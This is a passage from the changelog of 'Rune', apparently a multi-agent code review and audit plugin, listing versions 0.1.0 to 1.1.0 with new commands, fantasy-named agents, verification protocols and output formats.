- Runebinder aggregation prompt (`tarnished-prompts/runebinder.md`) — TOME.md generation with dedup algorithm, completion.json
- Truthseer Validator prompt (`tarnished-prompts/truthseer-validator.md`) — audit coverage validation for Phase 5.5

### Fixed

- Stale version labels: "Deferred to v1.0" → "Deferred to v2.0" in `truthsight-pipeline.md`
- Removed redundant "(v1.0)" suffixes from agent tables in `tarnished-guide/SKILL.md`

### Changed

- `specflow-findings.md` reorganized: "Resolved" table (20 items with version), "Open — Medium" (5), "Open — Low" (3)

## [1.1.0] - 2026-02-12

### Added

- 4 new Rune Circle reference files:
  - `smart-selection.md` — File-to-Tarnished assignment, context budgets, focus mode
  - `task-templates.md` — TaskCreate templates for each Tarnished role
  - `output-format.md` — Raw finding format, validated format, JSON output, TOME format
  - `validator-rules.md` — Confidence scoring, risk classification, dedup, gap reporting
- Agent Role Patterns section in `rune-orchestration/SKILL.md` — summon patterns for Review/Audit/Research/Work/Conditional/Validation
- Truthseer Validator (Phase 5.5) for audit workflows — cross-references finding density against file importance
- Seal Format specification in `rune-circle/SKILL.md` with field table and completion signal
- Output Directory Structure showing all expected files per workflow
- JSON output format (`{tarnished}-findings.json`) and `completion.json` structured summary

### Changed

- `inscription-protocol.md` expanded from 184 to 397 lines:
  - Authority Precedence rules, Coverage Matrix, Full Prompt Injection Template
  - Truthbinding Protocol with hallucination type table
  - 3-Tier Clarification Protocol, Self-Review Detection Heuristics
  - State File Integration with state transitions
  - Per-Workflow Adaptations with output sections
- `truthsight-pipeline.md` expanded from 121 to 280+ lines:
  - Circuit breaker state machines (CLOSED/OPEN/HALF_OPEN) for Layer 0 and Layer 2
  - Sampling strategy table, 5 verification tasks, hallucination criteria
  - Context budget table, verifier output format, timeout recovery
  - Re-verify agent decision logic, integration points
- `rune-circle/SKILL.md` Phase 6 (Verify) with detailed Layer 0/1/2 inline validation

### Fixed

- Stray "review-teams" reference replaced with "Rune Circle"

## [1.0.1] - 2026-02-12

### Added

- Circle Registry (`rune-circle/references/circle-registry.md`) — agent-to-Tarnished mapping with audit scope priorities and context budgets
- `--focus <area>` and `--max-agents <N>` flags for `/rune:audit`
- `--partial` flag for `/rune:appraise` (review staged files only)
- Known Limitations and Troubleshooting sections in README
- `.gitattributes` with `merge=union` strategy for Rune Echoes files

### Fixed

- Missing cross-reference from `rune-circle/SKILL.md` to `circle-registry.md`

## [1.0.0] - 2026-02-12

### Added

- `/rune:devise` — Multi-agent planning with parallel research pipeline
  - 3 new research agents (lore-seeker, realm-analyst, lore-scholar) plus echo-reader (from v0.3.0)
  - Optional brainstorm phase (`--brainstorm`)
  - Optional deep section-level research (`--deep`)
  - Scroll Reviewer document quality check
- `/rune:strive` — Swarm work execution with self-organizing task pool
  - Rune Smith (implementation) and Trial Forger (test) workers
  - Dependency-aware task scheduling via TaskCreate/TaskUpdate
  - Auto-scaling workers (2-5 based on task count)
  - Ward Discovery Protocol for quality gates
- chronicle-miner agent (git history analysis)
- flow-seer agent (spec flow analysis)
- scroll-reviewer agent (document quality review)

## [0.3.0] - 2026-02-11

### Added

- Rune Echoes — 3-layer project memory system (Etched/Inscribed/Traced)
- `/rune:echoes` command (show, prune, reset, init)
- echo-reader research agent
- Echo persistence hooks in review and audit workflows

## [0.2.0] - 2026-02-11

### Added

- `/rune:audit` — Full codebase audit using Agent Teams
- `/rune:cancel-audit` — Cancel active audit

## [0.1.0] - 2026-02-11

### Added

- `/rune:appraise` — Multi-agent code review with Rune Circle lifecycle
- `/rune:cancel-review` — Cancel active review
- 5 Tarnished (Forge Warden, Ward Sentinel, Pattern Weaver, Glyph Scribe, Lore Keeper)
- 10 review agents with Truthbinding Protocol
- Rune Gaze file classification
- Inscription Protocol for agent contracts
- Context Weaving (overflow prevention, rot prevention)
- Runebinder aggregation with deduplication
- Truthsight P1 verification
